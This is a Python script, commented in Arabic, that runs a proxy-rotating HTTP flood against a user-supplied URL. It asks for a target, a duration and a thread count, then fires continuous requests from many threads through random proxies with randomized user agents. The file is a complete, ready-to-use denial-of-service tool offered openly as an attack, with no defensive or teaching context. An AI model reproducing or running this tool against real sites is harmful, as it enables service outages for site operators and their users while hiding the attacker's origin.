import os
import time
import random
import threading
from urllib.parse import urlparse
from urllib.request import ProxyHandler, build_opener, Request
from user_agent import generate_user_agent

# ألوان
Z = '\033[1;31m'  # Red
F = '\033[1;32m'  # Green
S = '\033[1;33m'  # Yellow
B = '\x1b[38;5;208m'  # Orange
C = '\033[2;36m'  # Cyan

# فحص الرابط
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

# تحميل البروكسيات من ملف خارجي فقط
def load_proxies():
    file_path = "proxies.txt"
    if not os.path.isfile(file_path):
        print(Z + "[x] File 'proxies.txt' not found. Please add it before running.")
        exit(1)
    with open(file_path, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(Z + "[x] 'proxies.txt' is empty. Please add proxies.")
            exit(1)
        print(F + f"[✓] Loaded {len(proxies)} proxies.")
        return proxies

proxy_list = load_proxies()

# إدخال المعلومات
while True:
    url = input(f'{B}ENTER TARGET URL (ex: https://example.com): ')
    if is_valid_url(url):
        break
    print(Z + "[x] Invalid URL. Try again.")

duration = int(input(f'{B}ATTACK DURATION (SECONDS): '))
threads = int(input(f'{B}NUMBER OF THREADS: '))
end_time = time.time() + duration

# دالة الهجوم بالبروكسيات
def ProxyAttack():
    while time.time() < end_time:
        proxy = random.choice(proxy_list)
        protocol = 'https' if url.startswith('https') else 'http'
        full_proxy = f'{protocol}://{proxy}'
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        try:
            proxy_handler = ProxyHandler({protocol: full_proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(Request(url, headers=headers), timeout=5)
            if req.status == 200:
                print(F + f"[GOOD] {url} | {proxy}")
            else:
                print(Z + f"[BAD] {url} | {proxy} | Status: {req.status}")
        except:
            print(S + f"[FAILED] {proxy}")

# تشغيل الهجوم
def start_attack():
    print(C + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(F + f"[✓] Attack Started: {url}")
    print(F + f"[✓] Duration: {duration}s | Threads: {threads}")
    print(F + "[✓] Using Real Proxies from 'proxies.txt'")
    print(C + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    for _ in range(threads):
        threading.Thread(target=ProxyAttack).start()

start_attack()